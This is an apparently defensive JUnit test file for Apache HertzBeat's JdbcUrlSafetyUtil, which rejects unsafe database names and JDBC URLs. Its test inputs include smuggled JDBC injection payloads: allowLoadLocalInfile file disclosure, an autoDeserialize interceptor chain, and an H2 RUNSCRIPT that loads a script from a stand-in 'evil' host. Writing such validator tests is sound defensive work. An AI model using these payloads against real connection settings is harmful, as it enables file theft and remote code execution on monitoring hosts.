/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.apache.hertzbeat.common.util;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Test case for {@link JdbcUrlSafetyUtil}
 */
class JdbcUrlSafetyUtilTest {

    @Test
    void testAcceptsOrdinaryDatabaseNames() {
        assertEquals("hertzbeat", JdbcUrlSafetyUtil.requireSafeDatabaseName("hertzbeat"));
        assertEquals("my_db-1", JdbcUrlSafetyUtil.requireSafeDatabaseName("my_db-1"));
        assertEquals("orcl.example.com", JdbcUrlSafetyUtil.requireSafeDatabaseName("orcl.example.com"));
        assertEquals("", JdbcUrlSafetyUtil.requireSafeDatabaseName(null));
        assertEquals("", JdbcUrlSafetyUtil.requireSafeDatabaseName(""));
    }

    @ValueSource(strings = {
        // the payload that turns a monitor into local file disclosure on the collector
        "test?allowLoadLocalInfile=true&z=",
        "test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&z=",
        // any character that carries jdbc url meaning has to be refused
        "db&user=root",
        "db=x",
        "db/../other",
        "db;DatabaseName=other",
        "db:1234",
        "db#fragment",
        "db name",
        "?leadingQuestion",
    })
    @ParameterizedTest
    void testRejectsDatabaseNamesCarryingUrlSyntax(String database) {
        assertThrows(IllegalArgumentException.class,
                () -> JdbcUrlSafetyUtil.requireSafeDatabaseName(database));
    }

    @Test
    void testRejectsDatabaseNameOverLength() {
        assertThrows(IllegalArgumentException.class,
                () -> JdbcUrlSafetyUtil.requireSafeDatabaseName("a".repeat(65)));
    }

    @Test
    void testAcceptsUrlsThisProjectBuilds() {
        assertDoesNotThrow(() -> JdbcUrlSafetyUtil.requireSafeJdbcUrl(
                "jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=utf-8&useSSL=false"));
        assertDoesNotThrow(() -> JdbcUrlSafetyUtil.requireSafeJdbcUrl(
                "jdbc:sqlserver://localhost:1433;DatabaseName=test;trustServerCertificate=true;"));
        assertDoesNotThrow(() -> JdbcUrlSafetyUtil.requireSafeJdbcUrl(
                "jdbc:oracle:thin:@localhost:1521/orcl"));
        assertDoesNotThrow(() -> JdbcUrlSafetyUtil.requireSafeJdbcUrl(null));
    }

    @ValueSource(strings = {
        "jdbc:mysql://localhost:3306/test?allowLoadLocalInfile=true",
        "jdbc:mysql://localhost:3306/test?autoDeserialize=true",
        "jdbc:mysql://localhost:3306/test?queryInterceptors=x",
        "jdbc:mysql://localhost:3306/test?allowMultiQueries=true",
        "jdbc:postgresql://localhost:5432/test?socketFactory=x",
        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
    })
    @ParameterizedTest
    void testRejectsUrlsCarryingDangerousDriverProperties(String url) {
        assertThrows(IllegalArgumentException.class, () -> JdbcUrlSafetyUtil.requireSafeJdbcUrl(url));
    }
}
